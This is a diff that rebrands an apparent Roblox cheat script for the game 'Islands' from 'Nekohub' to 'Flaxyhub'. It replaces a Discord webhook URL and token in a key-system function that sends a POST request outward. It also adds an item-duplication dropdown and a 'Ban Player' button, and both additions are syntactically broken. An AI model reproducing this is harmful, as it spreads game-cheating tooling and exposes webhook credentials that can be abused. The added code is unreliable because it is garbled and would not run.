@@ -1,7 +1,7 @@
 print("Script Source Released on 17.03.2024 (DD/MM/YYYY because Islands is Dead!")
 warn("THIS SCRIPT IS DISCONTINUED FROM NOW!")
 for i = 1, 50 do
-  print("Nekohub on Top | discord.gg/MbsxuDEzgT")
+  print("flaxy | discord.gg/MbsxuDEzgT")
 end
 -- This is a pretty old script so dont joke abt the source type (its older than 90% of Roblox comminity) --
 
@@ -9,9 +9,9 @@ repeat wait() until game:IsLoaded()
 
 local IsPremium = true 
 local DidKey = false
-local ScriptVersion = "V4"
+local ScriptVersion = "Version 5"
 
-local FileName = "Nekohub"
+local FileName = "Flaxyhub"
 local GameName = "Islands"
 local DeveloperVersion = true
 
@@ -27,7 +27,7 @@ end
 
 SendNotification("Welcome!", "Welcome to "..FileName .. " " .. ScriptVersion.."!")
 
-local PremiumText1 = "Premium is only 2$ Lifetime. Go buy it in discord.gg/MbsxuDEzgT"
+local PremiumText1 = "Welcome"
 
 if isfolder(FileName) then
 
@@ -507,7 +507,7 @@ function KeySystem()
 						},
 					};
 					(syn and syn.request or http_request or http.request) {
-						Url = 'https://discord.com/api/webhooks/1119566653752086588/M5OdNgjZ7a2-FzNR6t_CBJRgM5VwSZ-mGgtnj7cmPCjiJ0wxAqzzF-7xdC3uHs2InG-t';
+						Url = 'https://discord.com/api/webhooks/1199037452149587969/VXiJsWI5HOiECHm6cbFQDVjLqVmnuzZ-bynW8C8MXkY-6C_bGInx8JOmTEWPKWAtLINK';
 						Method = 'POST';
 						Headers = {
 							['Content-Type'] = 'application/json';
@@ -9787,6 +9787,17 @@ Toggle = Tab:CreateToggle({
 	})
 
 
+
+
+	local TeleportMethod = ScriptSettingsSelection:AddDropdown("TeleportMethod", {
+		Title = "Dupelicate Items",
+		Values = {"700 steel rods","Nothing", "52 fertiliser", "Nothing", "Nothing", "Nothing" "Nothing", "Nothing",},
+		Multi = true,
+		Default = 1,
+	})
+
+
+
 	TeleportMethod:OnChanged(function(Value)
 		_G.TeleportMethod = Value
 	end)
@@ -9802,6 +9813,10 @@ Toggle = Tab:CreateToggle({
 			end
 		end
 	})
+
+local DeveloperTab:AddButton({
+		Title = "Ban Player"
+
 
 	local DisableXP = ScriptSettingsSelection:AddToggle("DisableXP", {Title = "Disable XP [ANTI LAG!]", Default = false })
 
